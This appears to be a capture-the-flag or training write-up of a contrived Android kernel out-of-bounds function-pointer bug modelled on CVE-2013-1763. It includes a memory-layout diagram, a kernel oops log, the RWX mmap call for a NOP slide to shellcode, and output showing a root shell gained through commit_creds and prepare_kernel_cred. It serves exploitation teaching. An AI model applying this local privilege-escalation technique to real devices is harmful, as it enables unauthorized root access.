We are somewhat mimicking the socket_diag bug [CVE-2013-1763](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763).  There is a good writeup about it [here](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763)

A contrived example of the bug looks like this:

Some handlers (handler1, handler2, handler2) are pre-defined functions for use to operate on some data.

```c
typedef struct {
  int (* handle_data)(void);
} CommandHandler;

CommandHandler handlers[] = { handler1 , handler2, handler3 };
```

Later a command handler is selected from the list based on user controlled input, but the index into the handler list is not first validated to make sure that it is valid. This is called an out-of-bounds access.
```c
  CommandHandler current = handlers[user_controlled_index];
```

At some later time that command handler is used on some data.
```
int some_data = 0x1337;
current.handle_data(some_data);
```
In order to exploit this we want to choose an index that would cause a dereference to memory that we can map in userspace

```
                        +----+                    +------------+
                        |   Handler[0] 0xC00C4914 | 0xC00C1000 |+------------+
                        |                         +------------+             |
    cmd_handlers[]<-----+   Handler[1] 0xC00C4910 | 0xC00C0F00 |+-------------------+
                        |                         +------------+             |      |
                        |   Handler[2] 0xC00C490C | 0xC00C0300 |+---------------------------+
                        +----+                    +------------+             |      |       |
                                       0xC00C4908 | 0x00000000 |+-----------------------+   |
                                                  +------------+             |      |   |   |
                                       0xC00C4904 | 0xDEADBEEF |             |      |   |   |
                                                  +------------+             |      |   |   |
                                       0xC00C4900 | 0x004004F4 |+--------+   |      |   |   |
                                                  +------------+         |   |      |   |   |
                                                    .........            |   |      |   |   |
                                                  +------------+         |   |      |   |   |
        Executable code for handler[0] 0xC00C1000 |            | <-------|---+      |   |   |
                                                  +------------+         |          |   |   |
                                                     .........           |          |   |   |
                                                  +------------+         |          |   |   |
        Executable code for handler[1] 0xC00C0F00 |            | <-------|----------+   |   |
                                                  +------------+         |              |   |
                                                    .........            |              |   |
                                                  +------------+         |              |   |
        Executable code for handler[2] 0xC00C0300 |            | <-------|--------------|---+
                                                  +------------+         |              |
                                                  |            |         |              |
                                                  +------------+         |              |
                                                    ..........           |              |
                                                    Userspace            |              |
                                            +------------------------+   |              |
                                                  +------------+         |              |
                                                  |            |         |              |
                                                  +------------+         |              |
                                                     .........           |              |
                                                                         |              |
                                                  +------------+         |              |
                                                  | 0x00000000 |         |              |
                                                  +------------+         |              |
                                       0x004004F4 | 0x00000000 | <-------+              |
                                                  +------------+                        |
                                                  | 0x00000000 |                        |
                                                  +------------+                        |
              shell code goes here -->            |            |                        |
                                                  +------------+                        |
                                                     .........                          |
                                                  +------------+                        |
                     mmap_min_address             |            |                        |
                                                  +------------+                        |
                                                     .........                          |
                                                  +------------+                        |
                                       0x0000000  |            |<-----------------------+
                                                  +------------+
```

Low memory addreses are not mappable from userspace anymore.  There is a parameter which controls the smallest mappable address:

```
shell@hammerhead:/ $ cat /proc/sys/vm/mmap_min_addr                            
32768
```

Therefore, we need to find a kernel pointer that derefences itself > 32768, but less than where kernel memory starts.  We can play the guess and check game by slowly incrementing the index counter until we reach a pointer that is dereferenced in userspace.

```
[   62.021784] Unable to handle kernel paging request at virtual address 6867696c
[   62.021869] pgd = ea170000
[   62.022079] [6867696c] *pgd=00000000
[   62.022173] Internal error: Oops: 80000005 [#1] PREEMPT SMP ARM
[   62.022246] CPU: 0    Not tainted  (3.4.0-g380afe0-dirty #9)
[   62.022316] PC is at 0x6867696c
[   62.022360] LR is at ai_ch_ioctl+0x40/0x50
[   62.022400] pc : [<6867696c>]    lr : [<c040a074>]    psr: 60000013
[   62.022402] sp : ea067ef8  ip : ea067f08  fp : ea067f04
[   62.022506] r10: 00000000  r9 : ed2ddca0  r8 : 00000200
[   62.022576] r7 : ea0e30c0  r6 : 00000005  r5 : ea0e30c0  r4 : 00000000
[   62.022616] r3 : 6867696c  r2 : c107a268  r1 : 00001337  r0 : ea0e30c0
[   62.022687] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
[   62.022727] Control: 10c5787d  Table: 3257006a  DAC: 00000015
[   62.022798]
[   62.022799] LR: 0xc0409ff4:
```

Now once we have a pointer being dereferenced in userspace we want to map memory before the derefence to give us a better chance of hitting the target, zero the memory region (zero is nop in ARM), and nop slide to our shellcode.

```
   __u32 mmap_start = 0x68670000, mmap_size = 0x15000;
   void * mapped = mmap((void*) mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);

```

Doing so gets us:
```
shell@hammerhead:/data/local/tmp $ ./solution
[+] resolved symbol commit_creds to 0xc01bac14
[+] resolved symbol prepare_kernel_cred to 0xc01bb404
[+] Mapping userspace memory at 0x68670000
[+] Triggering the exploit
uid=0, euid=0
root@hammerhead:/ # 
```




